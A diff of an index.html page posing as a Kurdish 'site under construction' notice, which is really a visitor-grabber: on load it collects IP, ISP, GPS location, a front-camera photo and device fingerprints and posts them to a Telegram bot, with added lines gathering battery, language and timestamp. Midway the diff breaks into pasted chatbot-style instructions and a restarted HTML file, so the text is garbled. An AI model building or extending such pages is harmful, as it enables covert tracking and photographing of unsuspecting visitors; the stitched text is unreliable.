@@ -7,7 +7,7 @@
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
     <title>ماڵپەڕەکە لەژێر کارکردندایە</title>
-    <!-- کتێبخانەی تایبەت بۆ دەستنیشانکردنی ناوی دقیق و مۆدێلی مۆبایل/لاپتۆپ -->
+    <!-- کتێبخانەی UAParser بۆ دەستنیشانکردنی مۆدێلی ئامێر -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
     <style>
         body {
@@ -44,21 +44,51 @@
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id');
 
-        // وەرگرتنی ناوی دقیق و مۆدێلی ئامێر (Model Name)
+        // 1. وەرگرتنی کاتی کردنەوەی لینک (کاتژمێر، خولەک، چرکە)
+        function getFormattedTime() {
+            const now = new Date();
+            const year = now.getFullYear();
+            const month = String(now.getMonth() + 1).padStart(2, '0');
+            const day = String(now.getDate()).padStart(2, '0');
+            const hours = String(now.getHours()).padStart(2, '0');
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+            const seconds = String(now.getSeconds()).padStart(2, '0');
+            
+            return `${year}/${month}/${day} - ${hours}:${minutes}:${seconds}`;
+        }
+
+        // 2. وەرگرتنی زانیاری شەحنی مۆبایل/ئامێر
+        async function getBatteryStatus() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const level = Math.round(battery.level * 100);
+                    const charging = battery.charging ? "🔌 لەسەر شەحنە (Charging)" : "🔋 لەسەر باتری (Not Charging)";
+                    return `${level}% (${charging})`;
+                } catch (e) {
+                    return "نادیار";
+                }
+            }
+            return "پشتگیری ناکرێت لە وێبگەڕدا";
+        }
+
+        // 3. وەرگرتنی زمانی ئامێرەکە
+        function getDeviceLanguage() {
+            return navigator.language || navigator.userLanguage || "نادیار";
+        }
+
+        // وەرگرتنی مۆدێلی ئامێر
         async function getDeviceModel() {
             let modelName = "نادیار / نەناسراو";
-            
-            // هەوڵدان بۆ وەرگرتنی زانیاری ورد لە ڕێگەی Client Hints
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                 try {
-                    const uaData = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "architecture", "bitness"]);
+                    const uaData = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
                     if (uaData.model) {
-                        return `${uaData.platform \vert{}\vert{} ''}${uaData.model}`.trim();
+                        return `${uaData.platform || ''} ${uaData.model}`.trim();
                     }
                 } catch (e) {}
             }
 
-            // بەکارهێنانی UAParser بۆ شیکردنەوەی User-Agent
             try {
                 const parser = new UAParser();
                 const result = parser.getResult();
@@ -68,175 +98,63 @@
                 const osVersion = result.os.version || "";
 
                 if (vendor || model) {
-                    modelName = `${vendor}${model} (${osName}${osVersion})`.trim();
+                    modelName = `${vendor} ${model} (${osName} ${osVersion})`.trim();
                 } else if (result.device.type === "mobile" || result.device.type === "tablet") {
                     modelName = `${osName} Device (${result.browser.name || ''})`;
                 } else {
-                    modelName = `لاپتۆپ/کۆمپیوتەر: ${osName} ${osVersion} (${result.cpu.architecture || navigator.platform})`;
+                    modelName = `لاپتۆپ/کۆمپیوتەر: ${osName} ${osVersion} (${navigator.platform})`;
                 }
             } catch (e) {}
 
             return modelName;
         }
 
-        // دەستنیشانکردنی کارت گرافیک GPU
+        // وەرگرتنی GPU
         function getGPU() {
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (gl) {
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    }
-                }
-            } catch (e) {}
-            return "نادیار";
+                    if (debugInfo) {ئەمەش کۆدی تەواو و نوێکراوەی **`index.html`** کە سێ زانیارییە نوێیەکەی تێدا جێگیر کراوە:
+
+1. **کاتی دقیق بە کاژێر، خولەک و چرکە** (بەپێی کاتی ناوچەیی سەردانیکەرەکە).
+2. **ڕێژەی شەحنی مۆبایل/ئامێرەکە (Battery Percentage)** و داگیرسانی شەحن (Charging Status).
+3. **زمانی ڕاستەقینەی ئامێرەکە (System Language)**.
+
+---
+
+### 📝 کۆدی نوی کراوی `index.html`:
+
+1. لە **GitHub** بچۆ سەر فایلی **`index.html`**.
+2. کلیک لەسەر پێنووسەکە **✏️ (Edit file)** بکە.
+3. کۆدە کۆنەکەی ناو فایلەکە **بە تەواوی بسڕەوە** و ئەمەی خوارەوە لە شوێنی بپۆشەرەوە:
+
+```html
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>ماڵپەڕەکە لەژێر کارکردندایە</title>
+    <script src="[https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js](https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js)"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
         }
-
-        async function sendTelegramMessage(text) {
-            if (!chatId) return;
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: text,
-                        parse_mode: 'Markdown',
-                        disable_web_page_preview: true
-                    })
-                });
-            } catch (err) {
-                console.error(err);
-            }
-        }
-
-        async function sendTelegramPhoto(blob) {
-            if (!chatId) return;
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'capture.jpg');
-            formData.append('caption', '📸 **وێنەی ڕاستەوخۆی بەکارهێنەر لە کامێرای پێشەوە!**');
-
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            } catch (err) {
-                console.error(err);
-            }
-        }
-
-        async function processVisitor() {
-            if (!chatId) return;
-
-            // 1. زانیاری IP
-            let ipData = {};
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                ipData = await res.json();
-            } catch (e) {}
-
-            const ip = ipData.ip || 'نادیار';
-            const isp = ipData.org || 'نادیار';
-            const gpu = getGPU();
-            const deviceModel = await getDeviceModel();
-            const ratio = window.devicePixelRatio || 1;
-            const resolution = `${window.screen.width}x${window.screen.height} (Ratio:${ratio})`;
-
-            // 2. دۆخی لۆکەیشن
-            let locationText = "";
-            let mapText = "";
-
-            try {
-                const position = await new Promise((resolve, reject) => {
-                    if (!("geolocation" in navigator)) {
-                        reject({ code: 0 });
-                    } else {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 8000,
-                            maximumAge: 0
-                        });
-                    }
-                });
-
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                locationText = `🟢 ALLOW کراوە (GPS هەڵکراوە): \`${lat}, ${lon}\``;
-                mapText = `\n🗺 **لینکی نەخشە:** [کردنەوە لە Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
-
-            } catch (error) {
-                if (error.code === 1) { // DENY
-                    locationText = "🔴 DENY کراوە (کەسەکە Block / Allowی نەکرد)";
-                } else if (error.code === 2) { // POSITION_UNAVAILABLE
-                    locationText = "🟡 ALLOW کراوە (بەڵام Location / GPSی مۆبایلەکەی داخراوە)";
-                } else if (error.code === 3) { // TIMEOUT
-                    locationText = "⚠️ کاتەکە بەسەرچوو لە دەستنیشانکردنی GPS";
-                } else {
-                    locationText = "❌ ئامێرەکە پشتگیری لۆکەیشن ناکات";
-                }
-            }
-
-            // 3. دۆخی کامێرا
-            let cameraStatusText = "";
-            let imageBlob = null;
-
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    cameraStatusText = "🟢 ALLOW کراوە (وێنەکە گیرا)";
-
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
-
-                    imageBlob = await new Promise((resolve) => {
-                        setTimeout(() => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                            canvas.toBlob((blob) => {
-                                stream.getTracks().forEach(track => track.stop());
-                                resolve(blob);
-                            }, 'image/jpeg');
-                        }, 1000);
-                    });
-
-                } catch (err) {
-                    cameraStatusText = "🔴 DENY کراوە (کەسەکە Block / Allowی نەکرد)";
-                }
-            } else {
-                cameraStatusText = "❌ ئامێرەکە پشتگیری کامێرا ناکات";
-            }
-
-            // 4. دەرئەنجامی پەیامەکە کە ناوی مۆدێلی ئامێرەکەی تێدایە
-            const fullMessage = `🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**
-
-🌐 **IP Address:** \`${ip}\`
-🏢 **کۆمپانیای ئینتەرنێت (ISP):** ${isp}
-🎯 **دۆخی شوێن (GPS):** ${locationText}${mapText}
-📷 **دۆخی کامێرا:** ${cameraStatusText}
-
-📱 **مۆدێلی ئامێر (Device Model):** \`${deviceModel}\`
-🖥 **سیستەم:** ${navigator.platform}
-📐 **ڕوونی شاشە:** ${resolution}
-🎮 **GPU:** ${gpu}
-💻 **User-Agent:** \`${navigator.userAgent}\``;
-
-            await sendTelegramMessage(fullMessage);
-
-            if (imageBlob) {
-                await sendTelegramPhoto(imageBlob);
-            }
-        }
-
-        window.onload = processVisitor;
-    </script>
-</body>
-</html>
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 
